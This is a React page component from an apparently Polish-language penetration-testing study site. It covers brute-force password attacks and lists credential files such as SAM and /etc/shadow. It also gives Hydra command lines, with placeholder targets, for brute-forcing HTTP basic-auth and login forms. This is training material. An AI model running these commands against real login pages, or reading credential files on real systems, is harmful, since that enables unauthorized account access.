import { Link } from 'react-router-dom';
import brute_force from '../../assets/brute_force.png';
import brute_force_example from '../../assets/brute_force_example.png';

import ExampleFrame from '../exampleFrame/ExampleFrame';

const BruteForce = () => {

    return(
        <section>
            <h1>Brute Force</h1>

            <p>Oto mała lista plików, które mogą zawierać zaszyfrowane hasła:</p>

            <table class="table table-striped text-left">
                <thead>
                    <tr>
                    <th><strong><code>Windows</code></strong></th>
                    <th><strong><code>Linux</code></strong></th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                    <td>unattend.xml</td>
                    <td className='important'>shadow</td>
                    </tr>
                    <tr>
                    <td>sysprep.inf</td>
                    <td className='important'>shadow.bak</td>
                    </tr>
                    <tr>
                    <td>SAM</td>
                    <td className='important'>password</td>
                    </tr>
                </tbody>
            </table>

            <table>
                <thead>
                    <tr>
                        <th><strong>Password Attack Type</strong></th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td>Dictionary attack</td>
                    </tr>
                    <tr>
                        <td>Brute force</td>
                    </tr>
                    <tr>
                        <td>Inspekcja ruchu - Traffic interception</td>
                    </tr>
                    <tr>
                        <td>Man In the Middle</td>
                    </tr>
                    <tr>
                        <td>Key Logging</td>
                    </tr>
                    <tr>
                        <td>Inżynieria społeczna - Social engineering</td>
                    </tr>
                </tbody>
            </table>

            <div className='waring'>
                <p>hydra -C ./seclists/lits,txt {`<TARGET IP>`} -s {`<TARGET PORT>`} http-get /</p>
            </div>

            <ExampleFrame screen={brute_force} />

            <table>
                <thead>
                    <tr>
                    <th>Options</th>
                    <th>Description</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td>-C lits.txt</td>
                        <td>Połączona lista słów poświadczeń - Wordlist</td>
                    </tr>
                    <tr>
                        <td>SERVER_IP</td>
                        <td>IP celu</td>
                    </tr>
                    <tr>
                        <td>-s PORT</td>
                        <td>Port celu</td>
                    </tr>
                    <tr>
                        <td>http-get</td>
                        <td>Metoda zapytania</td>
                    </tr>
                    <tr>
                        <td>/</td>
                        <td>Ścieżka celu</td>
                    </tr>
                </tbody>
            </table>

            <div className='waring'>
                <p>hydra -L {`<LISTA USERÓW>`} -P {`<LISTA HASEŁ>`} -u -f {`<TARGET IP>`} -s {`<TARGET PORT>`} http-get /</p>
                <p className='important'><span className='important'>-f</span> - w momenci pierwszego pomyślnego logowania przerywa enumerację</p>
                <p className='important'><span className='important'>-u</span> - sprawdza najpier wszystkie hasła do jednego usera, po czym przechodzi do następnego usera</p>
                <p className='important'><span className='important'>-L</span> - lista nazw userów</p>
                <p className='important'><span className='important'>-l</span> - jeden konkretny user</p>
                <p className='important'><span className='important'>-P</span> - lista haseł</p>
                <p className='important'><span className='important'>-p</span> - jedno konkretne hasło</p>
            </div>
            <ExampleFrame screen={brute_force_example} />

            <div className='waring'>
                <span className='important'>Hydra udostępnia wiele różnych typów żądań, których możemy użyć do brutalnego wymuszenia różnych usług.</span>
                <p>hydra -h | grep "Supported services" | tr ":" "\n" | tr " " "\n" | column -e</p>
                <span className='important'>Przykład użcia danego modułu</span>
                <p>hydra http-post-form -U</p>
            </div>

            <table>
                <thead>
                    <tr>
                        <th><strong>Type</strong></th>
                        <th><strong>Wartość Boolean</strong></th>
                        <th><strong>Flaga</strong></th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td><code>Fail</code></td>
                        <td>FALSE</td>
                        <td><code>F=html_content</code></td>
                    </tr>
                    <tr>
                        <td><code>Success</code></td>
                        <td>TRUE</td>
                        <td><code>S=html_content</code></td>
                    </tr>
                </tbody>
            </table>
            
            <div className='waring'>
                <span className='important'>{`<url>:<form parameters>:<condition string>[:<optional>[:<optional>]`}</span>
                <p className='important'>{`"/login.php:[user parameter]=^USER^&[password parameter]=^PASS^:F=<form name='login'"`}</p>
                <span className='important'>{`hydra -l <USER> -P <LISTA HASEŁ> -f <TARGET IP> -s <PORT> http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"`}</span>
            </div>

         </section>
    )
};

export default BruteForce;